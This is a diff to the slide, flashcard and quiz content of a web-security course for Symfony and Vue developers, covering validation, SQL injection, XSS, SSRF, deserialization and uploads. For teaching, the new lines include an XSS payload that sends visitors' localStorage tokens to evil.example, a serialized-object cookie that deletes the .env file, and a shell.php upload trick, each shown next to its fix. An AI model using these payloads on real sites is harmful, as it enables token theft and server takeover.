@@ -30,6 +30,9 @@ slides:
               - 'Mandatory on every request'
               - 'Allowlist: say what is valid, reject the rest'
               - 'Check type, length, limits and format'
+      - type: text
+        body: |
+          Without a check, anyone can run `curl -X POST /orders -d '{"quantity": -5}'`. The total becomes -5 times the price, and the shop now owes the customer money. With the DTO below, the same request is refused with a 422 and the message "This value should be between 1 and 10". The order code never sees it.
       - type: code
         lang: php
         file: 'src/Dto/CreateOrderRequest.php + controller'
@@ -99,7 +102,7 @@ slides:
           // SELECT * FROM users WHERE email = '' OR '1'='1'
         marks:
           - {line: 2, tip: 'The input is glued straight into the string. Now it is possible to close the quote and inject your own SQL.'}
-          - {line: 6, tip: '"OR 1=1" is always true, so every user''s row comes back. It gets worse: DROP TABLE, or leaked passwords.'}
+          - {line: 6, tip: '"OR 1=1" is always true, so every user''s row comes back. It gets worse: a UNION can read other tables, such as password hashes.'}
       - type: code
         lang: php
         file: 'src/Repository/UserRepository.php'
@@ -119,9 +122,14 @@ slides:
               'SELECT id FROM users WHERE email = :email',
               ['email' => $email],
           );
+
+          // ORDER BY can't take a parameter: choose from a fixed list instead
+          $column = ['price' => 'p.price', 'name' => 'p.name'][$sort] ?? 'p.price';
+          $qb->orderBy($column);
         marks:
           - {line: 4, tip: ':email is a blank slot; the value never becomes part of the SQL, because the database driver sends it separately.'}
           - {line: 13, tip: 'In Doctrine DBAL too, a user''s value is never glued into the string.'}
+          - {line: 17, tip: 'The user''s word only picks a key. Only our own column string reaches the SQL, and anything unknown falls back to p.price.'}
       - type: quote
         body: 'No input inside the SQL: the SQL is one thing, the input is a separate parameter.'
     aside:
@@ -161,48 +169,74 @@ slides:
           </script>
 
           <template>
-            <!-- Fine: {{ }} escapes by itself, <script> just shows up as text -->
+            <!-- body = <img src=x onerror="fetch('https://evil.example/?t=' + localStorage.token)"> -->
             <h4>{{ comment.author }}</h4>
-
-            <!-- Danger: v-html runs user-written text as HTML -->
             <div v-html="comment.body"></div>
           </template>
         marks:
-          - {line: 7, tip: 'Both Vue''s {{ }} and Twig''s {{ }} escape by default: < becomes &lt;, so tags don''t run.'}
-          - {line: 10, tip: 'v-html and Twig''s |raw turn escaping off. Using them on user-written text leaves the door to XSS open.'}
+          - {line: 7, tip: 'Both Vue''s {{ }} and Twig''s {{ }} escape by default: < becomes &lt;, so tags don''t run. The author name is safe.'}
+          - {line: 8, tip: 'v-html and Twig''s |raw turn escaping off. The image fails to load, onerror fires, and every visitor''s token is sent to evil.example.'}
       - type: code
-        lang: yaml
-        file: 'config/packages/html_sanitizer.yaml'
+        lang: vue
+        file: 'CommentItem.vue'
         variant: good
         code: |
-          framework:
-              html_sanitizer:
-                  sanitizers:
-                      app.comment_sanitizer:
-                          allow_safe_elements: true
-                          allow_relative_links: true
-                          force_attribute:
-                              a: { rel: 'noopener nofollow' }
+          <script setup lang="ts">
+          import DOMPurify from 'dompurify'
+          import { computed } from 'vue'
+
+          const props = defineProps<{ comment: { author: string; body: string } }>()
+          // keeps b, i, a, ul and other safe tags; cuts script, onerror, javascript: links
+          const safeBody = computed(() => DOMPurify.sanitize(props.comment.body))
+          </script>
+
+          <template>
+            <h4>{{ comment.author }}</h4>
+            <!-- plain-text comments: just use {{ comment.body }}, no v-html at all -->
+            <div v-html="safeBody"></div>
+          </template>
         marks:
-          - {line: 5, tip: 'Only safe tags (p, b, a, ul...) remain; script, onclick and iframe are cut out.'}
+          - {line: 7, tip: 'The same hostile body goes in; the onerror attribute comes out, so only a harmless image tag is left. Bold and links survive.'}
+          - {line: 13, tip: 'v-html now receives only the cleaned text. For plain text, drop v-html and let {{ }} escape it.'}
+      - type: visual
+        kind: compare
+        caption: 'Where to clean the HTML: both work, one covers more'
+        columns:
+          - title: 'Clean in the browser'
+            tone: warn
+            icon: browser
+            tip: 'Quick to add, but the raw HTML is still stored and served to every other client.'
+            items:
+              - 'DOMPurify before v-html, as in the code above'
+              - 'Protects only this Vue app: a mobile app or an email still gets raw HTML'
+              - 'Good as a second layer, not the only one'
+          - title: 'Clean on the server'
+            tone: good
+            icon: shield
+            tip: 'The dirty HTML never reaches the database, so every client is safe at once.'
+            items:
+              - 'HtmlSanitizer at save time: one cleaning that every client benefits from'
+              - 'Define app.comment_sanitizer under framework.html_sanitizer'
+              - 'Cost: a few lines of config and one sanitize() call per save'
       - type: quote
         body: 'Show user-written text either escaped or sanitized; never put it in as it is.'
     aside:
       - type: tips
         items:
-          - 'If you truly need rich text (such as blog comments), sanitize it with HtmlSanitizerInterface $appCommentSanitizer before saving it or showing it.'
+          - 'On the server, inject HtmlSanitizerInterface $appCommentSanitizer (defined in config/packages/html_sanitizer.yaml with allow_safe_elements: true) and call sanitize() before saving.'
           - 'Add a Content-Security-Policy header as a second wall: if inline scripts are blocked, the damage from XSS stays limited.'
           - 'A token kept in localStorage can be stolen through XSS; that is why the session cookie should be HttpOnly.'
       - type: terms
         items:
           - {term: 'Escape', meaning: 'Turning special characters like < > & " into harmless text, so the browser doesn''t take them for tags.'}
           - {term: 'CSP', meaning: 'A header that tells the browser which sources scripts may run from.'}
+          - {term: 'Sanitize', meaning: 'Cutting a piece of HTML down to a safe list of tags and attributes and throwing the rest away.'}
       - type: refs
         items:
           - {to: 'security/sessions-tokens', label: 'Where to keep tokens'}
     check:
       q: 'A comment needs a little bold text and a link. Why is v-html dangerous, and what is the alternative?'
-      a: 'v-html runs every tag, including <script> and onerror. Instead, sanitize on the server with HtmlSanitizer, keep only safe tags, and then display it.'
+      a: 'v-html runs every tag, including <script> and onerror. Instead, sanitize (on the server with HtmlSanitizer, or with DOMPurify in the browser), keep only safe tags, and then display it.'
 
   - slug: ssrf
     title: 'SSRF: making the server open an inner door'
@@ -269,9 +303,11 @@ slides:
           - 'Learn to recognize features that take a URL: image import, webhook URLs, link previews, PDF rendering. SSRF hides there.'
           - 'In the cloud, keep IMDSv2 (token-based metadata) turned on; then a plain GET can''t fetch keys.'
           - 'The strongest wall is a network rule on the server (an egress firewall) that never lets the app reach internal addresses at all.'
+          - 'The price of the allowlist: users can import only from hosts you approved. If you must accept any URL, fetch it from an isolated worker with no route to your internal network.'
       - type: terms
         items:
           - {term: 'SSRF', meaning: 'Server-Side Request Forgery: tricking the server into sending requests on the attacker''s behalf.'}
+          - {term: 'Egress firewall', meaning: 'A network rule on where the server itself is allowed to connect out to.'}
     check:
       q: 'A user supplies evil.com, whose DNS answer is 127.0.0.1. Why does checking only the hostname leave a hole?'
       a: 'An unlisted hostname is rejected, true, but an approved name can also point at an internal IP. So you must check the resolved IP too, which NoPrivateNetworkHttpClient does.'
@@ -292,10 +328,20 @@ slides:
         file: 'src/Controller/CartController.php'
         variant: bad
         code: |
+          // Somewhere in the app (or in a library it uses):
+          final class TempFile
+          {
+              public string $path;
+              public function __destruct() { unlink($this->path); }   // tidies up when freed
+          }
+
           // The cart is stored in a cookie as PHP-serialized data
           $cart = unserialize(base64_decode($request->cookies->get('cart')));
+          // Attacker's cookie: O:8:"TempFile":1:{s:4:"path";s:13:"/var/www/.env";}
+          // PHP builds a TempFile; when it is freed, __destruct() deletes the .env file
         marks:
-          - {line: 2, tip: 'The cookie is in the client''s hands. If they send a serialized object of their own making, PHP runs that class''s __destruct or __wakeup.'}
+          - {line: 5, tip: 'An innocent method, until an attacker can choose the path. Real attacks chain such methods from the app''s or a library''s classes.'}
+          - {line: 9, tip: 'The cookie is in the client''s hands. If they send a serialized object of their own making, PHP runs that class''s __destruct or __wakeup.'}
       - type: code
         lang: php
         file: 'src/Controller/CartController.php'
@@ -338,11 +384,14 @@ slides:
         title: 'Receiving parcels at the post office'
         body: |
           A post office doesn't trust the label on a parcel; it weighs it and looks at what is inside. Then it stamps its own number and puts it in a warehouse customers can't enter. Uploads work the same way: the name and type sent by the client are only a label.
+      - type: text
+        body: |
+          Without these rules, an attacker uploads `shell.php` and labels it `image/jpeg`. The old code saved it as `public/uploads/shell.php`. Opening that URL runs the attacker's PHP on your server, which is now theirs. With the code below, a file that isn't a real JPEG or PNG is refused with a 422, and even a real one gets a random name in a folder the web server never serves.
       - type: points
         title: 'Five rules for uploads'
         style: check
         items:
-          - 'Set a size limit; otherwise huge files fill up disk and memory (DoS).'
+          - 'Set a size limit; otherwise huge files fill disk and memory and knock the site over (DoS).'
           - 'Allowlist the types (jpg, png, pdf), and check the real content type from inside the file.'
           - 'Throw away the client''s name and generate a random one; this stops path tricks like "../../x.php".'
           - 'Store files outside the web root, or in separate storage (like S3), and never let code run there.'
@@ -379,6 +428,10 @@ slides:
           - '"I only look at the extension": shell.php.jpg or a doctored header slips through easily. Look at the content.'
           - 'Storing in public/uploads/ with PHP execution allowed: an uploaded shell.php becomes a web shell right away.'
           - 'SVG can contain script (XSS); if you must show a user''s SVG, sanitize it or avoid it.'
+      - type: terms
+        items:
+          - {term: 'Web root', meaning: 'The folder the web server hands out to anyone on the internet by URL.'}
+          - {term: 'Web shell', meaning: 'An uploaded script that gives the attacker a command line on your server, through the browser.'}
       - type: tips
         items:
           - 'When serving the file back, set the Content-Type yourself and add the X-Content-Type-Options: nosniff header.'
@@ -394,6 +447,11 @@ flashcards:
     a: 'Because an attacker can skip the browser and send requests directly. The client''s check is for convenience, the server''s is for security.'
     more: |
       Anyone can send any value straight to the API with curl or Postman. A Vue form shows mistakes quickly, but it can't stop anyone. With a DTO and constraints on the server, every request is checked by the same rules.
+    ref: validate-at-the-door
+  - q: 'What can happen if an order endpoint doesn''t validate quantity?'
+    a: 'Someone sends quantity -5 with curl, the total goes negative, and the shop owes money. A Range(min: 1, max: 10) constraint refuses it with a 422.'
+    more: |
+      The value must pass both the type (an int, not the string "abc") and the limits. A DTO with constraints checks both before your order code runs, so the rest of the code can trust what it receives.
     ref: validate-at-the-door
   - q: 'What is the difference between an allowlist and a blocklist, and which is better?'
     a: 'An allowlist says what passes and rejects the rest. A blocklist says what is refused and lets the rest through. The allowlist is safer.'
@@ -419,6 +477,11 @@ flashcards:
     a: 'Vue''s `v-html` and Twig''s `|raw`: both turn escaping off and run user-written text as HTML.'
     more: |
       If you truly must display rich text, sanitize it on the server with HtmlSanitizer, keep only safe tags, and then show it. Add a CSP header on top, which blocks inline scripts, so even one mistake does limited damage.
+    ref: xss
+  - q: 'Should rich-text comments be cleaned in the browser or on the server?'
+    a: 'On the server, at save time, with HtmlSanitizer. A browser-only cleaner such as DOMPurify protects just that one client.'
+    more: |
+      A mobile app or an email that shows the same comment would still get the raw HTML. Cleaning once on the server covers every client; keep DOMPurify as a second layer if you like. The price is a few lines of config and one sanitize() call.
     ref: xss
   - q: 'What is SSRF, and in which features does it show up most?'
     a: 'The server sends a request to a user-supplied URL and ends up reaching the internal network. Image import, webhook URLs, link previews.'
@@ -498,6 +561,22 @@ quiz:
       - text: 'Cleaning it with HtmlSanitizer, then displaying it'
         correct: false
         why: 'This is the remedy: only safe tags stay, and script or event handlers are dropped.'
+    ref: xss
+  - q: 'Karim posts the comment `<b>Nice</b><img src=x onerror=steal()>`. Rahim wants to keep the bold. Which fix is right?'
+    hint: 'Which fix removes the dangerous part and keeps the harmless part?'
+    options:
+      - text: 'Sanitize the HTML (HtmlSanitizer on the server, or DOMPurify) and show the cleaned result'
+        correct: true
+        why: 'The bold tag stays, and the onerror attribute is cut, so nothing runs.'
+      - text: 'Delete the word "script" from every comment'
+        correct: false
+        why: 'The attack above has no "script" word at all; a blocklist always misses some form.'
+      - text: 'Keep v-html and add only a Content-Security-Policy header'
+        correct: false
+        why: 'CSP is a good second wall, but alone it leaves the hole open and only limits the damage.'
+      - text: 'Switch to {{ comment.body }}'
+        correct: false
+        why: 'It is safe, but the bold tag would then show up as literal text, so the feature is lost.'
     ref: xss
   - q: 'Rashed''s app has an "import a photo from a URL" feature. Which measure best prevents SSRF?'
     hint: 'Who should decide the list of places the server may go?'
